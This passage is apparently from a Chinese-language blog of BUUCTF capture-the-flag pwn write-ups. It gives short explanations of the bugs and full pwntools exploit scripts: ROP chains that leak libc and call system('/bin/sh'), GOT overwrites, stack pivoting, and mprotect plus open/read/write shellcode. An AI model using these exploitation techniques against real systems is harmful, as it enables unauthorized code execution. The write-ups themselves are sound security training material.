class="comment">#2 0x38</span></span><br><span class="line"><span class="comment">#3 0x60</span></span><br><span class="line"><span class="comment">#没问题</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;3. Large\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;Enter your item`s name: \n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot; like to remove?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以加0x14</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_list</span>(<span class="params">size,num</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;3. Large\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;would you like to add?\n&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;you like to edit?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">b&quot;item`s new name: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def convert_str_asmencode(content: str):</span></span><br><span class="line"><span class="comment">#     out = &quot;&quot;</span></span><br><span class="line"><span class="comment">#     for i in content:</span></span><br><span class="line"><span class="comment">#         out = hex(ord(i))[2:] + out</span></span><br><span class="line"><span class="comment">#     out = &quot;0x&quot; + out</span></span><br><span class="line"><span class="comment">#     return out</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;input: &quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span>+p64(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">b&quot;guess the random value: \n&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">b&quot;target: &quot;</span>,<span class="string">b&quot;a\x00&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">b&quot;input: &quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004010a3</span></span><br><span class="line">payload=<span class="string">b&quot;a\x00&quot;</span>.ljust(<span class="number">0x78</span>,<span class="string">b&quot;a&quot;</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x400880</span> )</span><br><span class="line">sla(<span class="string">b&quot;guess the random value: \n&quot;</span>,payload)</span><br><span class="line">ru(<span class="string">b&quot;it?\n&quot;</span>)</span><br><span class="line">libc_base=u64(rld().ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;input: &quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span>+p64(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">b&quot;guess the random value: \n&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">b&quot;target: &quot;</span>,<span class="string">b&quot;a\x00&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">b&quot;input: &quot;</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004010a3</span></span><br><span class="line">payload=<span class="string">b&quot;a\x00&quot;</span>.ljust(<span class="number">0x78</span>,<span class="string">b&quot;a&quot;</span>)+p64(<span class="number">0</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\0&quot;</span>)))+p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">sla(<span class="string">b&quot;guess the random value: \n&quot;</span>,payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-silverbullet"><a href="#pwnable-silverbullet" class="headerlink" title="pwnable_silverbullet"></a>pwnable_silverbullet</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_silverbullet">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>题目还算比较有意思，利用strcat\x00修改长度达到溢出的效果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;description of bullet :&quot;</span>, b<span class="string">&quot;b&quot;</span> * <span class="number">0x2F</span>)</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;another description of bullet :&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;another description of bullet :&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;\xff&quot;</span> * <span class="number">7</span> + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(elf.sym[<span class="string">&quot;main&quot;</span>]) + p32(elf.got[<span class="string">&quot;puts&quot;</span>]),</span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">ru(b<span class="string">&quot;win !!\n&quot;</span>)</span><br><span class="line">libc_base = u32(rld()) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;description of bullet :&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x2F</span>)</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sa(b<span class="string">&quot;another description of bullet :&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;another description of bullet :&quot;</span>,</span><br><span class="line">    b<span class="string">&quot;\xff&quot;</span> * <span class="number">7</span></span><br><span class="line">    + p32(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    + b<span class="string">&quot;a&quot;</span> * <span class="number">4</span></span><br><span class="line">    + p32(libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>))),</span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;Your choice :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="xm-2019-awd-pwn1"><a href="#xm-2019-awd-pwn1" class="headerlink" title="xm_2019_awd_pwn1"></a>xm_2019_awd_pwn1</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#xm_2019_awd_pwn1">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>题目还不错，跟之前32位的有一点点不一样，64位的write和read低3位不一样，所以需要爆破</p>
<p>这种题目一定要注意，利用 plt+6复原got表，因为我们先把read改成了write,回到main之前要恢复过来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x00000000004006A3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004006A1</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26330</span>)</span><br><span class="line">    s(</span><br><span class="line">        b<span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">        + p64(pop_rsi_r15_ret)</span><br><span class="line">        + p64(elf.got[<span class="string">&quot;read&quot;</span>])#这里只用修改rsi为read got地址</span><br><span class="line">        + p64(<span class="number">0</span>)</span><br><span class="line">        + p64(elf.plt[<span class="string">&quot;read&quot;</span>])#调用read函数，修改readgot表为write</span><br><span class="line">        + p64(elf.plt[<span class="string">&quot;read&quot;</span>])#调用修改后的read，从readgot表开始打印泄露libc</span><br><span class="line">        + p64(pop_rsi_r15_ret)</span><br><span class="line">        + p64(elf.got[<span class="string">&quot;setbuf&quot;</span>])</span><br><span class="line">        + p64(<span class="number">0</span>)</span><br><span class="line">        + p64(elf.plt[<span class="string">&quot;read&quot;</span>] + <span class="number">6</span>)#这里单纯是想恢复read的got值，就委屈一下setbuf</span><br><span class="line">        + p64(elf.sym[<span class="string">&quot;vuln&quot;</span>])</span><br><span class="line">    )</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    s(<span class="string">&quot;\x40\x41&quot;</span>)#修改readgot地址</span><br><span class="line">    try:</span><br><span class="line">        libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    except:</span><br><span class="line">        io.close()</span><br><span class="line">s(p64(elf.plt[<span class="string">&quot;setbuf&quot;</span>] + <span class="number">6</span>))#恢复read用的setbuf,一定也要改成+<span class="number">6</span></span><br><span class="line">s(</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)))</span><br><span class="line">    + p64(<span class="number">0x000000000040048E</span>)#这里是ret地址，用来平衡<span class="number">64</span>位<span class="built_in">stack</span>检查</span><br><span class="line">    + p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">rl()</span><br></pre></td></tr></table></figure>

<h3 id="roarctf-2019-easyrop"><a href="#roarctf-2019-easyrop" class="headerlink" title="roarctf_2019_easyrop"></a>roarctf_2019_easyrop</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#roarctf_2019_easyrop">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题目其实比较简单，但是要注意就是我们栈溢出之后就会把保存长度给修改了，所以我们再溢出到这里的时候要把长度直接改到对应的ret adrr即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x401B93</span></span><br><span class="line">main_addr = <span class="number">0x4019F3</span></span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span> * <span class="number">0x418</span> + p8(<span class="number">0x28</span>)  # 如果不这样的话相当于我们把i给修改了，就会飞掉，这个地方刚好把偏移改到ret_addr</span><br><span class="line">payload += (</span><br><span class="line">    p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_addr)</span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line">ru(b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">mprotect_addr = libc_base + libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">pop_rsi_ret = <span class="number">0x23E6A</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x1B96</span> + libc_base</span><br><span class="line">start_addr = <span class="number">0x680200</span></span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span> * <span class="number">0x418</span> + p8(<span class="number">0x28</span>)</span><br><span class="line">payload += (</span><br><span class="line">    p64(pop_rdi_ret)</span><br><span class="line">    + p64(start_addr &amp; <span class="number">0xFFF000</span>)</span><br><span class="line">    + p64(pop_rsi_ret)</span><br><span class="line">    + p64(<span class="number">0x1000</span>)</span><br><span class="line">    + p64(pop_rdx_ret)</span><br><span class="line">    + p64(<span class="number">7</span>)</span><br><span class="line">    + p64(mprotect_addr)</span><br><span class="line">    + p64(main_addr)</span><br><span class="line">)</span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span> * <span class="number">0x418</span> + p8(<span class="number">0x28</span>)</span><br><span class="line">payload += (</span><br><span class="line">    p64(pop_rsi_ret)</span><br><span class="line">    + p64(start_addr)</span><br><span class="line">    + p64(pop_rdi_ret)</span><br><span class="line">    + p64(<span class="number">0x0</span>)</span><br><span class="line">    + p64(pop_rdx_ret)</span><br><span class="line">    + p64(<span class="number">0x100</span>)</span><br><span class="line">    + p64(read_addr)</span><br><span class="line">    + p64(start_addr)</span><br><span class="line">)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rdi,&#123;convert_str_asmencode(&quot;</span>./flag<span class="string">&quot;)&#125;;</span></span><br><span class="line"><span class="string">push rdi;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rdx,0x40;</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,1;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">sa(b<span class="string">&quot;\x00&quot;</span>, <span class="keyword">asm</span>(payload))</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-ne-3"><a href="#ciscn-2019-ne-3" class="headerlink" title="ciscn_2019_ne_3"></a>ciscn_2019_ne_3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_ne_3">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>一道挺麻烦的题目，一定需要把栈迁移的很远，不然有一些系统调用就会挂掉，同时有时候read一定也要覆盖掉返回地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sa(b<span class="string">&quot;:&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ret_call_addr = <span class="number">0x80486D0</span>#返回系统里面的read的push <span class="number">0</span></span><br><span class="line">read_start_addr = <span class="number">0x0804A060</span>#这个刚好可以修改掉返回地址</span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;length of password: &quot;</span>,</span><br><span class="line">    b<span class="string">&quot;-1\n\0&quot;</span> + p32(ret_call_addr) + p32(read_start_addr) + p32(<span class="number">0x100</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;):&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x48</span> + p32(<span class="number">0x0804A068</span>))#因为esp是通过ecx来迁移的，所以只用修改ecx</span><br><span class="line"></span><br><span class="line">bss_start_av = <span class="number">0x804A300</span>#很远的一个无用的地方，如果太近了system会挂掉</span><br><span class="line">pop_ebp_ret = <span class="number">0x0804881B</span></span><br><span class="line">leave_ret = <span class="number">0x08048575</span></span><br><span class="line">sa(</span><br><span class="line">    b<span class="string">&quot;contiune\n&quot;</span>,</span><br><span class="line">    p32(pop_ebp_ret)</span><br><span class="line">    + p32(bss_start_av)</span><br><span class="line">    + p32(elf.plt[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p32(leave_ret)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(bss_start_av + <span class="number">4</span>)</span><br><span class="line">    + p32(<span class="number">0x100</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">s(</span><br><span class="line">    p32(elf.plt[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    + p32(pop_ebp_ret)</span><br><span class="line">    + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    + p32(elf.plt[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(bss_start_av + <span class="number">0x14</span>)</span><br><span class="line">    + p32(<span class="number">0x100</span>)</span><br><span class="line">)</span><br><span class="line">libc_base = u32(ru(b<span class="string">&quot;\xf7&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr = libc.sym[<span class="string">&quot;system&quot;</span>] + libc_base</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">sa(b<span class="string">&quot;\xf7&quot;</span>, p32(system_addr) + p32(system_addr) + p32(bin_sh_addr))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="xp0intctf-2018-gameserver"><a href="#xp0intctf-2018-gameserver" class="headerlink" title="xp0intctf_2018_gameserver"></a>xp0intctf_2018_gameserver</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#xp0intctf_2018_gameserver">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>智障题目，snprintf返回值是实际需要的大小，而不是真正保存的大小，所以存在栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sla(b<span class="string">&quot;me you name?\n&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">254</span>)</span><br><span class="line">sla(b<span class="string">&quot;occupation?\n&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">254</span>)</span><br><span class="line">sla(b<span class="string">&quot;by yourself?[Y/N]&quot;</span>, b<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x114</span> + b<span class="string">&quot;b&quot;</span> + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(<span class="number">0x8048637</span>) + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">)</span><br><span class="line">s(payload)</span><br><span class="line">ru(b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">rl()</span><br><span class="line">libc_base = u32(r(<span class="number">4</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sla(b<span class="string">&quot;me you name?\n&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">254</span>)</span><br><span class="line">sla(b<span class="string">&quot;occupation?\n&quot;</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">254</span>)</span><br><span class="line">sla(b<span class="string">&quot;by yourself?[Y/N]&quot;</span>, b<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">payload = (</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">0x114</span></span><br><span class="line">    + b<span class="string">&quot;b&quot;</span></span><br><span class="line">    + p32(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    + p32(<span class="number">0</span>)</span><br><span class="line">    + p32(libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)))</span><br><span class="line">)</span><br><span class="line">s(payload)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="inndy-very-overflow"><a href="#inndy-very-overflow" class="headerlink" title="inndy_very_overflow"></a>inndy_very_overflow</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_very_overflow">BUUCTF在线评测</a></p>
<p>一个简单的输出结构题目，伪造指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">add</span><span class="params">(content: bytes)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;action: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Input your note: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span><span class="params">(index: <span class="type">int</span>, content: bytes)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;action: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Which note to edit: &quot;</span>, str(index).encode())</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Your new data: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(index: <span class="type">int</span>)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;action: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Which note to show: &quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">dump</span><span class="params">(index: <span class="type">int</span>)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;action: &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span><span class="params">(b<span class="string">&quot;a&quot;</span>)</span></span><br><span class="line"><span class="title function_">add</span><span class="params">(b<span class="string">&quot;b&quot;</span>)</span></span><br><span class="line"><span class="title function_">add</span><span class="params">(b<span class="string">&quot;c&quot;</span>)</span></span><br><span class="line"><span class="title function_">edit</span><span class="params">(<span class="number">0</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">3</span> + p32(elf.got[<span class="string">&quot;puts&quot;</span>]))</span></span><br><span class="line"><span class="title function_">show</span><span class="params">(<span class="number">2</span>)</span></span><br><span class="line"><span class="title function_">ru</span><span class="params">(b<span class="string">&quot;Next note: &quot;</span>)</span></span><br><span class="line">libc_base = <span class="type">int</span>(rld(), <span class="number">16</span>) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">3</span> + p32(elf.got[<span class="string">&quot;atoi&quot;</span>] - <span class="number">4</span>))</span><br><span class="line">edit(<span class="number">2</span>, p32(system_addr))</span><br><span class="line">sla(b<span class="string">&quot;action: &quot;</span>, b<span class="string">&quot;sh\0&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="inndy-homework"><a href="#inndy-homework" class="headerlink" title="inndy_homework"></a>inndy_homework</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_homework">BUUCTF在线评测</a></p>
<p>数组越界</p>
